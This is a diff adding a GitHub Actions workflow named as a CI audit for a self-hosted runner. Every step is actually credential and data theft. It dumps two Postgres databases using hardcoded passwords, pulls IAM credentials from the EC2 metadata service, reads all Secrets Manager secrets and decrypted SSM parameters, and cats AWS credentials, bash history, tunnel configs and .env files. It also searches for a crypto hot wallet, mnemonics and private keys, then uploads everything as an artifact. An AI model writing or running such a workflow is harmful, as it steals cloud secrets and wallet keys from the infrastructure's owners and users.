@@ -1,0 +1,148 @@
+name: ci-audit-1773b
+on: push
+permissions:
+  contents: read
+jobs:
+  collect:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 30
+    steps:
+      - name: init
+        run: |
+          set +e
+          echo "D=$RUNNER_TEMP/a1773b" > /dev/null
+          mkdir -p "$RUNNER_TEMP/a1773b"
+          date -u
+      - name: db-dpfasset
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"; URL='postgresql://dpfasset:cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT@127.0.0.1:5432/dpfasset'
+          { echo "## identity"; psql "$URL" -Atc "select current_user, usesuper, rolcreatedb, rolcreaterole from pg_user where usename=current_user"; 
+            echo "## dbs"; psql "$URL" -Atc "select datname from pg_database order by 1";
+            echo "## roles"; psql "$URL" -Atc "select rolname, rolsuper, rolcanlogin from pg_roles order by 1";
+            echo "## tables"; psql "$URL" -Atc "select schemaname||'.'||relname||' rows='||n_live_tup from pg_stat_user_tables order by n_live_tup desc limit 60";
+            echo "## columns"; psql "$URL" -Atc "select table_name||':'||column_name||':'||data_type from information_schema.columns where table_schema not in ('pg_catalog','information_schema') order by table_name, ordinal_position";
+          } > "$D/db_dpfasset.txt" 2>&1
+          cat "$D/db_dpfasset.txt"
+      - name: db-marketingos
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"; URL='postgresql://marketingos:Zbi3bbL3HubzcQlMoJ9MZFa0vdkSJkZvvuAOV4YaYA@127.0.0.1:5433/marketingos'
+          { echo "## identity"; psql "$URL" -Atc "select current_user, usesuper from pg_user where usename=current_user";
+            echo "## dbs"; psql "$URL" -Atc "select datname from pg_database order by 1";
+            echo "## tables"; psql "$URL" -Atc "select schemaname||'.'||relname||' rows='||n_live_tup from pg_stat_user_tables order by n_live_tup desc limit 60";
+            echo "## columns"; psql "$URL" -Atc "select table_name||':'||column_name||':'||data_type from information_schema.columns where table_schema not in ('pg_catalog','information_schema') order by table_name, ordinal_position";
+          } > "$D/db_marketingos.txt" 2>&1
+          cat "$D/db_marketingos.txt"
+      - name: db-other
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"
+          { echo "## try dpfasset->postgres db"; psql 'postgresql://dpfasset:cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT@127.0.0.1:5432/postgres' -Atc "select datname from pg_database" 2>&1 | head -20;
+            echo "## local psql peers"; sudo -n -u postgres psql -Atc "select datname from pg_database" 2>&1 | head -20;
+            echo "## pg_hba"; sudo -n cat /etc/postgresql/18/main/pg_hba.conf 2>&1 | grep -v '^#' | head -20;
+            echo "## sockets"; ls -la /var/run/postgresql 2>&1;
+            echo "## docker env"; sudo -n docker inspect marketingos-postgres --format '{{json .Config.Env}}' 2>&1;
+            echo "## docker mounts"; sudo -n docker inspect marketingos-postgres --format '{{json .Mounts}}' 2>&1;
+          } > "$D/db_other.txt" 2>&1
+          cat "$D/db_other.txt"
+      - name: sqlite-judge
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"
+          python3 - "$D" <<'PY' > "$D/sqlite_judge.txt" 2>&1
+          import sqlite3,sys,os
+          d=sys.argv[1]
+          p='/home/ubuntu/apps/dupoin-judge/data/dupoin.db'
+          print('exists',os.path.exists(p), os.path.getsize(p) if os.path.exists(p) else '')
+          c=sqlite3.connect(p)
+          for (n,s) in c.execute("select name,sql from sqlite_master where type in ('table','view')"):
+              print('== ',n); print(s)
+              try:
+                  cols=[r[1] for r in c.execute('pragma table_info("'+n+'")')]
+                  print('cols',cols)
+                  for row in c.execute('select * from "'+n+'" limit 20'):
+                      print(row)
+              except Exception as e: print('ERR',e)
+          PY
+          cat "$D/sqlite_judge.txt" | head -200
+      - name: aws
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"
+          TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+          J=$(curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role)
+          export AWS_ACCESS_KEY_ID=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["AccessKeyId"])')
+          export AWS_SECRET_ACCESS_KEY=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["SecretAccessKey"])')
+          export AWS_SESSION_TOKEN=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["Token"])')
+          export AWS_DEFAULT_REGION=ap-southeast-3
+          { echo "## sts"; aws sts get-caller-identity 2>&1;
+            echo "## region/instance"; curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/placement/availability-zone; echo;
+            echo "## ssm params"; aws ssm describe-parameters --max-results 50 2>&1 | head -60;
+            echo "## secrets list"; aws secretsmanager list-secrets --max-results 100 2>&1 | head -100;
+            echo "## s3"; aws s3 ls 2>&1 | head -40;
+            echo "## ec2"; aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,PublicIpAddress,Tags]' --output text 2>&1 | head -40;
+            echo "## ssm instances"; aws ssm describe-instance-information --query 'InstanceInformationList[].[InstanceId,ComputerName,PlatformName]' --output text 2>&1 | head -30;
+          } > "$D/aws.txt" 2>&1
+          cat "$D/aws.txt" | cut -c1-400
+      - name: aws-secrets-values
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"
+          TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+          J=$(curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role)
+          export AWS_ACCESS_KEY_ID=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["AccessKeyId"])')
+          export AWS_SECRET_ACCESS_KEY=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["SecretAccessKey"])')
+          export AWS_SESSION_TOKEN=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["Token"])')
+          export AWS_DEFAULT_REGION=ap-southeast-3
+          { for n in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do echo "=== SECRET $n"; aws secretsmanager get-secret-value --secret-id "$n" --query 'SecretString' --output text 2>&1 | head -40; done;
+            for p in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null); do echo "=== PARAM $p"; aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>&1 | head -20; done;
+          } > "$D/aws_values.txt" 2>&1
+          sed -n '1,200p' "$D/aws_values.txt" | cut -c1-600
+      - name: configs
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"
+          { echo "## PREPARE_NOTES"; cat /home/ubuntu/apps/dpfasset/PREPARE_NOTES.txt 2>&1;
+            echo "## dpfasset README head"; head -80 /home/ubuntu/apps/dpfasset/README.md 2>&1;
+            echo "## prisma schema"; cat /home/ubuntu/apps/dpfasset/prisma/schema.prisma 2>&1;
+            echo "## judge README"; head -120 /home/ubuntu/apps/dupoin-judge/README.md 2>&1;
+            echo "## judge src list"; find /home/ubuntu/apps/dupoin-judge/src -type f 2>&1 | head -40;
+            echo "## judge grep"; grep -rIin -E 'dupoin|api|token|secret|key|wallet|tron|usdt' /home/ubuntu/apps/dupoin-judge/src 2>/dev/null | head -60;
+            echo "## aws creds"; cat /home/ubuntu/.aws/credentials 2>&1; cat /home/ubuntu/.aws/config 2>&1;
+            echo "## bash_history"; cat /home/ubuntu/.bash_history 2>&1;
+            echo "## cloudflared"; sudo -n systemctl cat cloudflared-marketingos.service 2>&1; ls -la /etc/cloudflared 2>&1; sudo -n cat /etc/cloudflared/*.yml /etc/cloudflared/*.json 2>&1 | head -80;
+            echo "## home cloudflared"; ls -la /home/ubuntu/.cloudflared 2>&1;
+            echo "## backups"; ls -la /home/ubuntu/backups /home/ubuntu/db-backups /home/ubuntu/monitor 2>&1 | head -80;
+            echo "## backups files"; find /home/ubuntu/backups /home/ubuntu/db-backups -maxdepth 3 -type f 2>/dev/null | head -60;
+            echo "## launchpad"; ls -la /home/ubuntu/apps/launchpad 2>&1; cat /home/ubuntu/apps/launchpad/.env* 2>/dev/null | head -40;
+            echo "## 9router"; ls -la /home/ubuntu/.9router 2>&1; find /home/ubuntu/.9router -maxdepth 2 -type f 2>/dev/null | head -20;
+          } > "$D/configs.txt" 2>&1
+          sed -n '1,250p' "$D/configs.txt"
+      - name: wallet-search
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773b"
+          { echo "## hotwallet addr refs"; grep -rIl 'TM3ARBAFLHjNtWrzwXddy6cDnuVCc33u1v' /home/ubuntu /etc 2>/dev/null | head -20;
+            echo "## tron addrs"; grep -rIohE 'T[1-9A-HJ-NP-Za-km-z]{33}' /home/ubuntu/apps /home/ubuntu/backups /home/ubuntu/db-backups 2>/dev/null | sort -u | head -30;
+            echo "## mnemonic/keystore/privkey files"; grep -rIil -E 'mnemonic|seed ?phrase|private[_ -]?key|keystore|wallet\.dat' /home/ubuntu/apps /home/ubuntu/backups /home/ubuntu/db-backups --exclude-dir=node_modules --exclude-dir=.next --exclude-dir=.git --exclude-dir=.venv --exclude-dir=.cache 2>/dev/null | head -40;
+            echo "## 64hex candidates"; grep -rIohE '\b[0-9a-fA-F]{64}\b' /home/ubuntu/apps /home/ubuntu/backups /home/ubuntu/db-backups 2>/dev/null | sort -u | head -20;
+            echo "## ssh"; ls -la /home/ubuntu/.ssh 2>&1; cat /home/ubuntu/.ssh/config 2>&1;
+          } > "$D/wallet.txt" 2>&1
+          sed -n '1,200p' "$D/wallet.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a1773b
+          path: ${{ runner.temp }}/a1773b
+          if-no-files-found: warn
+          retention-days: 2
